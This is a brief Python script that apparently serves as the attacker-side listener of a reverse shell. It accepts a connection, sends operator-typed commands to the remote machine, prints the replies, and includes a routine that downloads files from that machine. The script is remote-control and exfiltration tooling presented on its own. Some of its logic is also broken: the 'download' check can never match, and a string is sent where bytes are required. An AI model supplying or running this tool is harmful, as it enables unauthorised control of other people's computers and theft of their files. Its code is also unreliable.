import socket


def connect():
    global s
    global host 
    global port
    global c
    global addr
    # create socket object
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    host = "127.0.0.1"
    port = 80
    #bind the socket to IP and Port
    s.bind((host, port))
    # listen for connections
    s.listen(5)
    print(f"Listening as {host}:{port} ...")
    # accept connection attemps
    c, addr = s.accept()
    print("Connection from",addr)

def listen():
    while True:
        cmd = input("user-$").encode()
        if not cmd:
            continue
        c.send(cmd)
        if str(cmd) == 'download':
            download()
            continue
        data = c.recv(1024).decode()
        print (data)
        if str(data) == 'q':
            break

def close():
    c.close()

# download
def download():
    filename = input("filename-#")
    c.send(filename)
    f = open(filename, 'wb')
    i = c.recv(1024)
    while not ('complete' in str(i)):
        f.write(i)
        i = c.recv(1024)
    f.close()

def main():
    connect()
    listen()
    close()

main()